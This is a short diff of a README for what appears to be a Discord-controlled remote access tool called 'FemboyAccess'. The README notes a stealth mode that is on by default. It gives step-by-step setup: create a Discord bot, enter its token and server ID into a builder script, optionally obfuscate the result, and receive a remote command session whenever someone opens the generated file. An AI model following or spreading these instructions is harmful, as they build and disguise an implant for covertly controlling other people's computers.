@@ -24,7 +24,7 @@ FemboyAccess 1.6 and higher contains a stealth mode activated by default (line `
   1. Download Python with all the necessary requirements and the repository to your computer.
   2. [Create a Discord bot](https://discord.dev/) (make sure to check all intents on) then invite it on a new server.
   3. Open `builder.py` and enter what's requested (server ID and bot token).
-  4. Finished! Now, you can obfuscate it yourself if you want to. Whenever someone will open the file, a new channel will be created in your defined server with a custom session ID. Type `help` to see a list of all available commands.
+  4. Finished! Now, you can obfuscate it yourself if you want to. Whenever someone will open the generated `built_femboyaccess.py` file, a new channel will be created in your defined server with a custom session ID. Type `help` to see a list of all available commands.
 
 Note: FemboyAccess treats all machines like sessions and attributes them a 8-character long ID with letters and numbers. That's how the bot can manage multiple machines at the same time. The format of the generated channel name is something like:
 
